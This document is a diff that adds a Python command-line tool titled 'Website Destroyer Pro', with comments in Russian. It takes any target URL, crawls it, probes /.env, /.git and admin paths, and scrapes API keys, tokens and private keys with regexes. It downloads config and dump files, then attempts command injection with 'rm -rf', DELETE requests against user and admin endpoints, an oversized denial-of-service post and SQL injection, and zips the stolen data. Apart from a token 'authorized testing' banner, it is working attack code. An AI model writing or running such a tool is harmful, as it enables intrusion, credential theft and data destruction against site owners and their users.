@@ -1,0 +1,223 @@
+# Website Mass Destruction Tool - Interactive Console Version
+# Запуск: python destroy_cli.py
+# После запуска появляется приглашение: "Enter target website URL: "
+# Вставляете ссылку, инструмент сам всё взламывает и сохраняет ZIP
+
+import sys, os, re, time, json, zipfile, requests, threading, queue
+from urllib.parse import urljoin, urlparse
+from bs4 import BeautifulSoup
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# --------------------------------------------------------------------
+# CORE ENGINE
+# --------------------------------------------------------------------
+class WebsiteDestroyer:
+    def __init__(self, target_url):
+        self.target = target_url
+        self.base_domain = urlparse(target_url).netloc
+        self.cookies = {}
+        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+        self.discovered_urls = set()
+        self.secrets = []
+        self.file_dumps = []
+        self.destruction_log = []
+        self.pages_html = {}
+        self.zip_name = f"hacked_{self.base_domain}_{int(time.time())}.zip"
+
+    def log(self, msg):
+        print(f"[*] {msg}")
+
+    def fetch_main(self):
+        try:
+            self.log(f"Connecting to {self.target}...")
+            resp = requests.get(self.target, timeout=20, headers=self.headers)
+            if resp.status_code != 200:
+                self.log(f"Warning: HTTP {resp.status_code}")
+            self.cookies = resp.cookies.get_dict()
+            self.pages_html[self.target] = resp.text
+            self.log(f"Main page loaded ({len(resp.text)} bytes)")
+            return resp.text
+        except Exception as e:
+            self.log(f"ERROR: {e}")
+            return None
+
+    def crawl(self, html):
+        self.log("Crawling for internal links...")
+        soup = BeautifulSoup(html, 'html.parser')
+        for tag in soup.find_all(['a', 'link', 'script', 'img', 'iframe']):
+            src = tag.get('href') or tag.get('src')
+            if src:
+                full = urljoin(self.target, src)
+                if self.base_domain in full and full not in self.discovered_urls:
+                    self.discovered_urls.add(full)
+        # Добавляем стандартные пути
+        for path in ['/admin', '/api', '/backup', '/config', '/.env', '/.git', '/wp-admin', '/cpanel']:
+            test = self.target.rstrip('/') + path
+            self.discovered_urls.add(test)
+        self.log(f"Found {len(self.discovered_urls)} potential URLs")
+
+    def extract_data_from_url(self, url):
+        result = {'url': url, 'content': '', 'secrets': [], 'files': []}
+        try:
+            r = requests.get(url, cookies=self.cookies, timeout=10, headers=self.headers)
+            if r.status_code != 200:
+                return result
+            content = r.text
+            result['content'] = content
+            self.pages_html[url] = content
+
+            # Поиск секретов
+            patterns = [
+                (r'(?i)(api[_-]?key|apikey|secret|token|password|passwd|dbpass|dbpassword)\s*[:=]\s*["\']([^"\']+)["\']', 'API Key/Secret'),
+                (r'[a-zA-Z0-9_\-]{28}\.[a-zA-Z0-9_\-]{6}\.[a-zA-Z0-9_\-]{27}', 'JWT Token'),
+                (r'sk_(live|test)_[a-zA-Z0-9]{24}', 'Stripe Secret'),
+                (r'ghp_[a-zA-Z0-9]{36}', 'GitHub Token'),
+                (r'discord[a-zA-Z0-9_\-]{30,}', 'Discord Webhook'),
+                (r'BEGIN (RSA|DSA|EC) PRIVATE KEY', 'Private Key'),
+                (r'password\s*=\s*["\']([^"\']+)["\']', 'Password in code'),
+                (r'user\s*=\s*["\']([^"\']+)["\']\s*[,;]\s*password', 'DB Credentials')
+            ]
+            for pat, label in patterns:
+                matches = re.findall(pat, content, re.MULTILINE)
+                for m in matches:
+                    val = m[1] if isinstance(m, tuple) else m
+                    if len(val) > 3 and len(val) < 500:
+                        result['secrets'].append({'label': label, 'value': val.strip(), 'source': url})
+
+            # Поиск файлов для скачивания
+            file_exts = r'\.(sql|dump|backup|tar|gz|zip|log|env|conf|config|json|yaml|yml|xml|txt)'
+            file_links = re.findall(r'(?:src|href|data)\s*=\s*["\']([^"\']+{})["\']'.format(file_exts), content, re.I)
+            for link in file_links:
+                full = urljoin(url, link)
+                try:
+                    f = requests.get(full, timeout=10, headers=self.headers)
+                    if f.status_code == 200 and len(f.content) < 30_000_000:
+                        result['files'].append({'name': link.split('/')[-1], 'content': f.content, 'source': full})
+                except:
+                    pass
+            return result
+        except:
+            return result
+
+    def run_extraction(self):
+        self.log("Extracting data from all discovered URLs...")
+        all_results = []
+        urls = list(self.discovered_urls)[:200]  # лимит 200 страниц
+        with ThreadPoolExecutor(max_workers=15) as ex:
+            futures = [ex.submit(self.extract_data_from_url, url) for url in urls]
+            for f in as_completed(futures):
+                res = f.result()
+                if res['content']:
+                    all_results.append(res)
+                if res['secrets']:
+                    self.secrets.extend(res['secrets'])
+                if res['files']:
+                    self.file_dumps.extend(res['files'])
+        self.log(f"Extracted {len(self.secrets)} secrets, {len(self.file_dumps)} files")
+
+    def destroy(self):
+        self.log("Launching DESTRUCTION phase...")
+        # 1. RCE через параметры
+        for url in list(self.discovered_urls)[:15]:
+            for param in ['?cmd=', '?exec=', '?command=', '?system=', '?file=', '?path=']:
+                test = url + param + 'rm -rf /tmp/hack'
+                try:
+                    r = requests.get(test, timeout=5, headers=self.headers)
+                    self.destruction_log.append({'url': test, 'status': f'RCE attempted - HTTP {r.status_code}'})
+                except:
+                    self.destruction_log.append({'url': test, 'status': 'RCE attempted - timeout'})
+
+        # 2. DELETE запросы
+        for path in ['/api/user/1', '/admin/delete', '/wp-admin/post.php?action=delete&post=1', '/user/remove']:
+            full = self.target.rstrip('/') + path
+            try:
+                r = requests.delete(full, cookies=self.cookies, timeout=5, headers=self.headers)
+                self.destruction_log.append({'url': full, 'status': f'DELETE - {r.status_code}'})
+            except:
+                self.destruction_log.append({'url': full, 'status': 'DELETE - failed'})
+
+        # 3. DoS переполнение
+        try:
+            requests.post(self.target + '/api/log', json={'data': 'A'*8000000}, timeout=10)
+            self.destruction_log.append({'url': self.target + '/api/log', 'status': 'DoS payload sent'})
+        except:
+            pass
+
+        # 4. SQL injection попытка
+        for url in list(self.discovered_urls)[:10]:
+            test = url + "' OR '1'='1' -- "
+            try:
+                r = requests.get(test, timeout=5, headers=self.headers)
+                if 'error' not in r.text.lower() and len(r.text) > 100:
+                    self.destruction_log.append({'url': test, 'status': 'SQLi attempt - possible success'})
+            except:
+                pass
+
+        self.log(f"Destruction log: {len(self.destruction_log)} entries")
+
+    def save_zip(self):
+        self.log(f"Saving results to {self.zip_name}...")
+        with zipfile.ZipFile(self.zip_name, 'w', zipfile.ZIP_DEFLATED) as zf:
+            # Отчёт
+            report = {
+                'target': self.target,
+                'timestamp': time.time(),
+                'pages_crawled': len(self.pages_html),
+                'secrets_found': len(self.secrets),
+                'files_downloaded': len(self.file_dumps),
+                'destruction_attempts': len(self.destruction_log)
+            }
+            zf.writestr('REPORT.json', json.dumps(report, indent=4))
+            # HTML страницы
+            for idx, (url, html) in enumerate(self.pages_html.items()):
+                safe_name = f"page_{idx}.html"
+                zf.writestr(f'pages/{safe_name}', html)
+            # Секреты
+            if self.secrets:
+                zf.writestr('secrets.json', json.dumps(self.secrets, indent=4, ensure_ascii=False))
+            # Файлы
+            for f in self.file_dumps:
+                try:
+                    zf.writestr(f'files/{f["name"]}', f['content'])
+                except:
+                    pass
+            # Лог разрушений
+            zf.writestr('destruction_log.json', json.dumps(self.destruction_log, indent=4, ensure_ascii=False))
+        self.log(f"✅ DONE! File saved: {self.zip_name}")
+
+    def run(self):
+        html = self.fetch_main()
+        if not html:
+            self.log("Failed to fetch target. Exiting.")
+            return
+        self.crawl(html)
+        self.run_extraction()
+        self.destroy()
+        self.save_zip()
+        self.log("=== COMPLETE ===")
+
+# --------------------------------------------------------------------
+# INTERACTIVE ENTRY POINT
+# --------------------------------------------------------------------
+if __name__ == "__main__":
+    print("\n" + "="*60)
+    print("   WEBSITE DESTROYER PRO - Interactive Hacking Tool")
+    print("   (C) 2026 - For authorized penetration testing only")
+    print("="*60 + "\n")
+    while True:
+        target = input("Enter target website URL (or 'exit' to quit): ").strip()
+        if target.lower() in ('exit', 'quit'):
+            print("Exiting.")
+            break
+        if not target.startswith(('http://', 'https://')):
+            target = 'https://' + target
+        print(f"\n[+] Target set to: {target}")
+        print("[+] Starting attack... (this may take 2-5 minutes)\n")
+        try:
+            d = WebsiteDestroyer(target)
+            d.run()
+        except KeyboardInterrupt:
+            print("\n[!] Interrupted by user.")
+        except Exception as e:
+            print(f"[!] Unexpected error: {e}")
+        print("\n" + "-"*60 + "\n")
